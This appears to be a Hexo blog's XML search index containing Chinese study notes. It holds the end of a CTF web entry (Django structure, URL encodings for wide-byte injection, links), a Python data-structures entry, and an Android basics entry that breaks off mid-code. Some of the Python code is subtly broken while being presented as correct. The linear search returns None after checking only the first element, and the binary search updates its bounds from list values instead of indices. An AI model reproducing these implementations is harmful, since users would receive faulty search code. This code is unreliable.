                   //自动化测试模块  在这里编写测试脚本<br>|– views.py                            //执行响应的代码所在模块  代码逻辑处理主要地点  项目大部分代码在此编写<br>|–templates                            //模板 放置模板文件的文件夹  包括HTML css JavaScript的文件夹</p><hr><p>MTV模式<br> M:model，模型，负责与数据库交互<br> V:view，视图是核心，负责接收请求、获取数据、返回结果<br> T:template，模板，负责呈现内容到浏览器</p><p>通常 一个Django model 对应一张数据表，model是以类的形式表现的<br>实现了ORM 对象与数据库映射 隐藏了数据访问细节 不需要写sql语句</p><p>admin是Django自带的    自动化数据管理界面</p><p>数据取出顺序 models-&gt;views-&gt;templates  数据层-&gt;逻辑视图层-&gt;前端模板层</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>URL转码<br> ‘ ——&gt; %27<br> 空格 ——&gt; %20<br> #符号 ——&gt; %23<br> \ ——&gt; %5C<br><a href="https://blog.csdn.net/m0_38103658/article/details/102721517?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control">https://blog.csdn.net/m0_38103658/article/details/102721517?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control</a></p><p>参考:<br><a href="https://www.freebuf.com/vuls/196088.html">https://www.freebuf.com/vuls/196088.html</a></p><hr><h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><p>根据题目可知可能和程序逻辑有关<br>使用admin注册显示已存在</p><hr><h1 id="facebook"><a href="#facebook" class="headerlink" title="facebook"></a>facebook</h1><hr><p>参考:<br>cat:<br><a href="https://www.cnblogs.com/chrysanthemum/p/11480150.html">https://www.cnblogs.com/chrysanthemum/p/11480150.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据结构</title>
      <link href="/2020/11/27/data-structure/"/>
      <url>/2020/11/27/data-structure/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度:"></a>时间复杂度:</h2><ul><li>for<br>O(n)</li></ul><ul><li>while<br>时间复杂度:<br><img src="1.png"></li></ul><h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>估算内存占用大小的式子</p><hr><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>调用自身</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">        func1(x-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    func1(x)</span><br></pre></td></tr></table></figure><h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_search</span>(<span class="params">li,val</span>):</span></span><br><span class="line">    <span class="keyword">for</span> index,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(li):</span><br><span class="line">        <span class="keyword">if</span> v == val:</span><br><span class="line">            <span class="keyword">return</span> index</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><p>二分查找比线性查找快</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span>(<span class="params">li,val</span>):</span></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="built_in">len</span>(li) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;=right:</span><br><span class="line">        mid =(left+right) //<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> li[mid] == val:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> li[mid]&gt; val :</span><br><span class="line">            right = li[mid] - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = li[mid] +<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>时间复杂度:<br><img src="3.png"></p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p><code>列表排序</code><br>内置排序sort()<br><img src="4.png"></p><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 冒泡排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span>(<span class="params">li</span>):</span></span><br><span class="line">    <span class="comment">#第i趟</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(li)-<span class="number">1</span>):</span><br><span class="line">        exchange = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(li)-i-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> li[j]&gt;li[j+<span class="number">1</span>]:</span><br><span class="line">                li[j],li[j+<span class="number">1</span>] = li[j+<span class="number">1</span>],li[j]</span><br><span class="line">                exchange = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(li)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exchange:</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">li = [random.randint(<span class="number">0</span>,<span class="number">6000</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">bubble_sort(li)</span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>找出一个最小的数,放到第一个位置<br>时间复杂度: [n*(n-1) ] / 2</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_sort</span>(<span class="params">li</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(li)-<span class="number">1</span>):</span><br><span class="line">        min_loc = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(li)):</span><br><span class="line">            <span class="keyword">if</span> li[j] &lt;li[min_loc]:</span><br><span class="line">                min_loc = j</span><br><span class="line">        <span class="keyword">if</span> min_loc != i:</span><br><span class="line">            li[i],li[min_loc] = li[min_loc],li[i]</span><br><span class="line">        <span class="built_in">print</span>(li)</span><br><span class="line">        </span><br><span class="line">li=[<span class="number">9</span>,<span class="number">6</span>,<span class="number">41</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">1</span>]</span><br><span class="line">select_sort(li)</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span>(<span class="params">li</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(li)): <span class="comment">#i -&gt; 摸到的牌的下标</span></span><br><span class="line">        tmp = li[i]</span><br><span class="line">        j= i-<span class="number">1</span> <span class="comment">#手里的牌的下标</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> j&gt;=<span class="number">0</span> <span class="keyword">and</span> li[j] &gt; tmp :</span><br><span class="line">            li[j+<span class="number">1</span>] = li[j]</span><br><span class="line">            j-=<span class="number">1</span></span><br><span class="line">        li[j+<span class="number">1</span>] = tmp</span><br><span class="line">        <span class="built_in">print</span>(li)</span><br><span class="line">li=[<span class="number">4</span>,<span class="number">34</span>,<span class="number">6</span>,<span class="number">42</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">7</span>]</span><br><span class="line">insert_sort(li) </span><br></pre></td></tr></table></figure><hr><p>参考:<br><a href="https://www.bilibili.com/video/BV1mp4y1D7UP?p=2">https://www.bilibili.com/video/BV1mp4y1D7UP?p=2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android 基础篇</title>
      <link href="/2020/11/25/Android-study/"/>
      <url>/2020/11/25/Android-study/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-生命周期"><a href="#0x01-生命周期" class="headerlink" title="0x01 生命周期"></a>0x01 生命周期</h2><p>Activity launched<br>onCreate(): 创建对象<br>onStart(): 当Acticity 呈现在屏幕上时调用<br>onResume(): 完成以后实现用户交互<br>Activity running(运行状态)<br>onPause(): (可见,用户不能与之交互)回到前台,进入暂停阶段<br>onStop(): 回到后台不可见<br>优先级更高的app需要内存资源的时候,会被kill<br>onDestroy():<br>Activity shutdown</p><h2 id="0x02-日志打印"><a href="#0x02-日志打印" class="headerlink" title="0x02 日志打印"></a>0x02 日志打印</h2><p>logd</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">String TAG=<span class="string">&quot;myTag&quot;</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStart();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onStart: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onResume: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onPause: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStop();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onStop: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onDestroy: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-控件点击事件"><a href="#0x03-控件点击事件" class="headerlink" title="0x03 控件点击事件"></a>0x03 控件点击事件</h2><ul><li>button点击触发事件<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Button button;</span><br><span class="line">  TextView textView;</span><br><span class="line">  String TAG=<span class="string">&quot;myTag&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_main);</span><br><span class="line">      button = findViewById(R.id.button1);</span><br><span class="line">      textView = findViewById(R.id.textView2);</span><br><span class="line">      textView.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">              textView.setText(<span class="string">&quot;welcome q0o0p-wow!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      Log.d(TAG, <span class="string">&quot;onCreate: view&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x04-屏幕旋转"><a href="#0x04-屏幕旋转" class="headerlink" title="0x04 屏幕旋转"></a>0x04 屏幕旋转</h2><p>创建手机屏幕旋转后的布局xml,点击activity_main.xml中的旋转图标创建<br><img src="1.png"></p><p>savedInstanceState 传递(临时)保存状态的数值<br>调用onSaveInstanceState函数,Bundle (“key”:value)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    button = findViewById(R.id.button1);</span><br><span class="line">    textView = findViewById(R.id.textView2);</span><br><span class="line">    textView.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">            textView.setText(<span class="string">&quot;welcome q0o0p-wow!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (savedInstanceState != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String s = savedInstanceState.getString(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        textView.setText(s);</span><br><span class="line">    &#125;</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;onCreate: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">( Bundle outState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">    outState.putString(<span class="string">&quot;key&quot;</span>,textView.getText().toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-启动模式的区别"><a href="#0x05-启动模式的区别" class="headerlink" title="0x05 启动模式的区别"></a>0x05 启动模式的区别</h2><p>AndroidManifest.xml–&gt;android:launchMode=”singleTask”</p><h3 id="启动模式解决的问题"><a href="#启动模式解决的问题" class="headerlink" title="启动模式解决的问题:"></a>启动模式解决的问题:</h3><pre><code>1. 有时候我们的App需要生成给其他App调用的Activity，例如浏览器应用，照相机应用2.解决生成重复页面等等Bug3.任务栈过深的时候，避免一直按返回键也退不回想要的页面</code></pre><h3 id="启动模式间的区别"><a href="#启动模式间的区别" class="headerlink" title="启动模式间的区别"></a>启动模式间的区别</h3><ul><li>standard : 标准普通,传统模式。(点击一次新建一个activity)</li><li>singleTop：消息推送,全局搜索框。(处于栈顶不会新建activity,不处于栈顶则新建一个activity)</li><li>singleTask：跨应用调用单任务，不要出现重复页面，同时可以避免标准普通模式的调用栈过深。()</li><li>singleInstance：全局单一实例。如电话来电页面。</li></ul><h2 id="0x06-状态式通知栏和抽屉式通知栏"><a href="#0x06-状态式通知栏和抽屉式通知栏" class="headerlink" title="0x06 状态式通知栏和抽屉式通知栏"></a>0x06 状态式通知栏和抽屉式通知栏</h2><p>Android从5.0开始,通知可以短暂地显示在浮动窗口中，称之为提醒式通知。这种行为通常适用于用户应立即知晓的重要通知，而且仅在设备未锁定时才会显示。<br><code>注:通知栏图标只能使用alpha图层绘制,而不应该包括RGB图层</code></p><p>以下情况可能会触发提醒式通知：</p><ul><li>用户的 Activity 处于全屏模式（应用使用 fullScreenIntent）。</li><li>通知的优先级很高，且在搭载 Android 7.1（API 级别 25）及更低版本的设备上使用铃声或振动。</li><li>在搭载 Android 8.0（API 级别 26）及更高版本的设备上，通知渠道的重要程度比较高。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">         manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);</span><br><span class="line">         if(Build.VERSION.SDK_INT&gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">             NotificationChannel channel = new NotificationChannel(&quot;q0o0p&quot;, &quot;测试通知&quot;, NotificationManager.IMPORTANCE_HIGH);</span><br><span class="line">             manager.createNotificationChannel(channel);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        Intent intent = new Intent(this, NotificationActivity.class);</span><br><span class="line">        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0);</span><br><span class="line"></span><br><span class="line">        notification = new NotificationCompat.Builder(this, &quot;q0o0p&quot;)</span><br><span class="line">                .setContentTitle(&quot;官方通知&quot;) //设置标题</span><br><span class="line">                .setContentText(&quot;q0o0p-wow&quot;) //设置文本内容</span><br><span class="line">                .setSmallIcon(R.drawable.ic_leaves) //设置小图标</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(),R.drawable.ic_user)) //设置通知大图标</span><br><span class="line">                .setColor(Color.parseColor(&quot;#FF0000&quot;)) //小图标颜色</span><br><span class="line">                .setContentIntent(pendingIntent) //点击通知后跳转意图</span><br><span class="line">                .setAutoCancel(true) //点击通知后自动清除通知</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    * 点击按钮触发</span><br><span class="line">    * 取消通知</span><br><span class="line">    * */</span><br><span class="line">    public void cancelNotification(View view) &#123;</span><br><span class="line">        //触发条件</span><br><span class="line">        manager.cancel(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //发送通知</span><br><span class="line">    public void sendNotification(View view) &#123;</span><br><span class="line">        manager.notify(1,notification);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>官方API: <a href="https://developer.android.google.cn/guide/topics/ui/notifiers/notifications?hl=zh-cn">https://developer.android.google.cn/guide/topics/ui/notifiers/notifications?hl=zh-cn</a></p><h2 id="0x07-toolbar基础用法"><a href="#0x07-toolbar基础用法" class="headerlink" title="0x07 toolbar基础用法"></a>0x07 toolbar基础用法</h2><h3 id="1-toolbar介绍"><a href="#1-toolbar介绍" class="headerlink" title="1. toolbar介绍"></a>1. toolbar介绍</h3><p>Toolbar 是在 Android 5.0 开始推出的一个 Material Design 风格的导航控件 ，Google 非常推荐大家使用 Toolbar 来作为Android客户端的导航栏，以此来取代之前的 Actionbar 。与 Actionbar 相比，Toolbar 明显要灵活的多。</p><h3 id="2-关闭固定标题栏"><a href="#2-关闭固定标题栏" class="headerlink" title="2. 关闭固定标题栏"></a>2. 关闭固定标题栏</h3><p>res -&gt; values -&gt; themes.xml<br><code>&lt;style name=&quot;Theme.Q0o0p_three&quot; parent=&quot;Theme.MaterialComponents.DayNight.DarkActionBar&quot;&gt;</code><br>将DarkActionBar—&gt;改为NoActionBar</p><p>activity_main.xml添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;androidx.appcompat.widget.Toolbar</span><br><span class="line">        android:layout_width=&quot;match_parent&quot;</span><br><span class="line">        android:layout_height=&quot;?attr/actionBarSize&quot;</span><br><span class="line">        android:background=&quot;#B6DAEA&quot; </span><br><span class="line">        app:navigationIcon=&quot;?attr/actionModeCloseDrawable&quot; //图标</span><br><span class="line">        app:titleTextColor=&quot;#000000&quot;</span><br><span class="line">        app:title=&quot;q0o0p&quot; //标题</span><br><span class="line">        app:titleMarginStart=&quot;5dp&quot; //距离</span><br><span class="line">        app:subtitle=&quot;wow&quot; //副标题</span><br><span class="line">        app:subtitleTextColor=&quot;@color/teal_700&quot; //副标题颜色</span><br><span class="line">        app:logo=&quot;@drawable/ic_leaves&quot; //app logo</span><br><span class="line">        /&gt;</span><br></pre></td></tr></table></figure><p>设置标题居中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;androidx.appcompat.widget.Toolbar</span><br><span class="line">     android:id=&quot;@+id/tb&quot;</span><br><span class="line">     android:layout_width=&quot;match_parent&quot;</span><br><span class="line">     android:layout_height=&quot;?attr/actionBarSize&quot;</span><br><span class="line">     android:background=&quot;#B6DAEA&quot;</span><br><span class="line">     app:navigationIcon=&quot;?attr/actionModeCloseDrawable&quot;&gt;</span><br><span class="line">     &lt;TextView</span><br><span class="line">         android:layout_width=&quot;match_parent&quot;</span><br><span class="line">         android:layout_height=&quot;match_parent&quot;</span><br><span class="line">         android:gravity=&quot;center&quot;</span><br><span class="line">         android:layout_gravity=&quot;center&quot;</span><br><span class="line">         android:text=&quot;q0o0p&quot;/&gt;</span><br><span class="line"> &lt;/androidx.appcompat.widget.Toolbar&gt;</span><br></pre></td></tr></table></figure><h2 id="0x08-AlertDialog对话框"><a href="#0x08-AlertDialog对话框" class="headerlink" title="0x08 AlertDialog对话框"></a>0x08 AlertDialog对话框</h2><h3 id="对话框简介"><a href="#对话框简介" class="headerlink" title="对话框简介"></a>对话框简介</h3><p>对话框是人机交互过程中十分常见的组件，一般用于在特定条件下对用户显示一些信息，可以增强应用的友好性。</p><p>Dialog 类是对话框的基类。对话框虽然可以在界面上显示，但是 Dialog 不是 View 类的子类，而是直接继承自 java.lang.Object 类。</p><p>Dialog 对象也有自己的生命周期，其生命周期由创建它的 Activity 进行管理。</p><p>常用的对话框有 AlertDialog 和 ProgressDialog，下面将通过实例讲解这两种对话框的使用方法。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Button</span><br><span class="line">        android:id=&quot;@+id/bt2&quot;</span><br><span class="line">        android:text=&quot;显示对话框&quot;</span><br><span class="line">        android:onClick=&quot;q0o0pClick&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public void q0o0pClick(View view) &#123;</span><br><span class="line">        //View dialogView = getLayoutInflater().inflate(R.layout.dialog_view, null);</span><br><span class="line">        AlertDialog.Builder builder = new AlertDialog.Builder(this);</span><br><span class="line">        builder.setIcon(R.mipmap.ic_user)</span><br><span class="line">                .setTitle(&quot;这是对话框&quot;)</span><br><span class="line">                .setMessage(&quot;uou&quot;)</span><br><span class="line">                .setPositiveButton(&quot;确定&quot;, new 